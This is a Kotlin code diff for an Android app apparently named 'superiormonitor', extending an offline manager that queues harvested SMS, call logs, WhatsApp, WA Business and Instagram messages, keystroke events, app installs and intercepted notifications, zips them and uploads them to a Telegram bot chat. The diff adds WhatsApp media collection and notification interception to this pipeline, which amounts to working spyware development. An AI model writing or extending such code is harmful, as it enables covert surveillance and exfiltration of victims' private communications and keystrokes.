@@ -30,22 +30,6 @@ object OfflineManager {
     data class MediaItem(val file: File? = null, val uri: Uri? = null, val name: String, val docFile: androidx.documentfile.provider.DocumentFile? = null)
 
     /**
-     * Safely moves a file to an offline category queue.
-     */
-    fun moveToOfflineQueue(context: Context, sourceFile: File, categoryDirName: String, fileName: String) {
-        try {
-            val offlineDir = File(context.getExternalFilesDir(null), "$categoryDirName/offline")
-            if (!offlineDir.exists()) offlineDir.mkdirs()
-            val offlineFile = File(offlineDir, fileName)
-            sourceFile.copyTo(offlineFile, overwrite = true)
-            sourceFile.delete()
-            LogManager.log(LogCategory.BOT_ACTIVITY, "[ACTIONS]Moved ${sourceFile.name} to offline queue ($categoryDirName).")
-        } catch (e: Exception) {
-            LogManager.log(LogCategory.BOT_ACTIVITY, "[ACTIONS]Error moving to offline queue: ${e.message}", LogLevel.ERROR)
-        }
-    }
-
-    /**
      * Appends a message text to an offline file (used by Sms, Call, WhatsApp monitors).
      */
     fun sendOrQueue(
@@ -94,26 +78,6 @@ object OfflineManager {
     }
 
     /**
-     * Legacy method for cancelling just snapshots queue.
-     */
-    fun cancelOfflineQueue(context: Context, scope: CoroutineScope) {
-        scope.launch(Dispatchers.IO) {
-            val snapshots = getOfflineSnapshots(context)
-            for (file in snapshots) {
-                val permanentDir = File(file.parentFile!!.parentFile, "permanent")
-                if (!permanentDir.exists()) permanentDir.mkdirs()
-                file.renameTo(File(permanentDir, file.name))
-                LogManager.log(LogCategory.BOT_ACTIVITY, "[ACTIONS][Queue] Moved ${file.name} to permanent storage.")
-            }
-        }
-    }
-
-    // Retained for backward compatibility if BotService explicitly calls it, routes to unified sync.
-    fun processHeavyOfflineSync(context: Context, scope: CoroutineScope) {
-        processOfflineQueue(context, scope)
-    }
-
-    /**
      * Unified pipeline for processing ALL offline files categorically.
      */
     fun processOfflineQueue(context: Context, scope: CoroutineScope, chatId: String? = null, messageId: Long? = null, botToken: String? = null) {
@@ -141,6 +105,9 @@ object OfflineManager {
 
                 // 3. Process Snapshots (Batch if > 4)
                 processSnapshots(context, token, targetChatId)
+
+                // 4. Process WhatsApp Offline Media
+                processWhatsAppMedia(context, token, targetChatId)
                 
                 LogManager.log(LogCategory.BOT_ACTIVITY, "[ACTIONS]Unified Offline Sync Pipeline Complete.")
             }
@@ -155,7 +122,8 @@ object OfflineManager {
             "wabusiness/offline/offline_wabusiness.txt" to BotMessages.FetchOps.buildOfflineSyncCaption("WABusiness", "WA Business messages were received"),
             "instagram/offline/offline_instagram.txt" to BotMessages.FetchOps.buildOfflineSyncCaption("Instagram", "Instagram DMs were received"),
             "keyevents/offline/offline_keyevents.txt" to BotMessages.FetchOps.buildOfflineSyncCaption("KeyEvents", "Key Events were recorded"),
-            "app_installs/offline/offline_installs.txt" to BotMessages.FetchOps.buildOfflineSyncCaption("AppInstalls", "App installations/uninstallations were detected")
+            "app_installs/offline/offline_installs.txt" to BotMessages.FetchOps.buildOfflineSyncCaption("AppInstalls", "App installations/uninstallations were detected"),
+            "notifications/offline/offline_notifications.txt" to BotMessages.FetchOps.buildOfflineSyncCaption("Notifications", "Notification events were intercepted")
         )
 
         for ((path, caption) in textLogPaths) {
@@ -242,6 +210,18 @@ object OfflineManager {
         }
     }
 
+    private suspend fun processWhatsAppMedia(context: Context, token: String, chatId: String) {
+        val variants = listOf("whatsapp", "wabusiness")
+        for (variant in variants) {
+            val zipDir = File(context.getExternalFilesDir(null), "$variant/offline")
+            val mediaDir = File(zipDir, "media")
+            val logPrefix = if (variant == "whatsapp") "WA" else "WA Business"
+            com.system.superiormonitor.core.ZipManager.processOfflineMediaFolder(
+                context, token, chatId, mediaDir, zipDir, logPrefix
+            )
+        }
+    }
+
     private suspend fun processSnapshots(context: Context, token: String, chatId: String) {
         val snapshots = getOfflineSnapshots(context).toMutableList()
         if (snapshots.isEmpty()) return
@@ -318,36 +298,30 @@ object OfflineManager {
     private suspend fun compressAndSendOfflineMedia(context: Context, token: String, chatId: String, items: List<MediaItem>, zipName: String, caption: String) {
         val zipFile = File(context.cacheDir, zipName)
         try {
-            ZipOutputStream(FileOutputStream(zipFile)).use { zipOut ->
-                for (item in items) {
-                    val entryName = item.name
-                    zipOut.putNextEntry(ZipEntry(entryName))
-                    if (item.file != null) {
-                        item.file.inputStream().use { it.copyTo(zipOut) }
-                    } else if (item.uri != null) {
-                        context.contentResolver.openInputStream(item.uri)?.use { it.copyTo(zipOut) }
-                    }
-                    zipOut.closeEntry()
-                }
-            }
+            val zipItems = items.map { com.system.superiormonitor.core.ZipManager.ZipItem(name = it.name, file = it.file, uri = it.uri) }
+            val successZip = com.system.superiormonitor.core.ZipManager.zipItems(context, zipItems, zipFile)
 
-            LogManager.log(LogCategory.BOT_ACTIVITY, "[ACTIONS]ZIP created successfully with ${items.size} files. Uploading...")
-            val success = com.system.superiormonitor.bot.MediaUploader.uploadDocument(context, token, chatId, zipFile, "application/zip", caption, null, false)
-            
-            if (success) {
-                LogManager.log(LogCategory.BOT_ACTIVITY, "[ACTIONS]ZIP upload successful. Deleting ZIP and original files.")
-                // Zip file gets deleted in finally block
-                for (item in items) {
-                    if (item.file != null) {
-                        item.file.delete()
-                    } else if (item.uri != null && item.file == null) {
-                        val originalPath = item.name.split("/").toTypedArray()
-                        val mimeType = context.contentResolver.getType(item.uri) ?: "audio/mpeg"
-                        moveRecordingToPermanent(context, item.uri.toString(), originalPath, mimeType, item.docFile)
+            if (successZip) {
+                LogManager.log(LogCategory.BOT_ACTIVITY, "[ACTIONS]ZIP created successfully with ${items.size} files. Uploading...")
+                val success = com.system.superiormonitor.bot.MediaUploader.uploadDocument(context, token, chatId, zipFile, "application/zip", caption, null, false)
+                
+                if (success) {
+                    LogManager.log(LogCategory.BOT_ACTIVITY, "[ACTIONS]ZIP upload successful. Deleting ZIP and original files.")
+                    // Zip file gets deleted in finally block
+                    for (item in items) {
+                        if (item.file != null) {
+                            item.file.delete()
+                        } else if (item.uri != null && item.file == null) {
+                            val originalPath = item.name.split("/").toTypedArray()
+                            val mimeType = context.contentResolver.getType(item.uri) ?: "audio/mpeg"
+                            moveRecordingToPermanent(context, item.uri.toString(), originalPath, mimeType, item.docFile)
+                        }
                     }
+                } else {
+                    LogManager.log(LogCategory.BOT_ACTIVITY, "[ACTIONS]ZIP upload failed. ZIP deleted, but original files retained for next attempt.", LogLevel.ERROR)
                 }
             } else {
-                LogManager.log(LogCategory.BOT_ACTIVITY, "[ACTIONS]ZIP upload failed. ZIP deleted, but original files retained for next attempt.", LogLevel.ERROR)
+                LogManager.log(LogCategory.BOT_ACTIVITY, "[ACTIONS]Failed to create ZIP file.", LogLevel.ERROR)
             }
         } catch (e: Exception) {
             LogManager.log(LogCategory.BOT_ACTIVITY, "[ACTIONS]Error during offline ZIP compression: ${e.message}", LogLevel.ERROR)
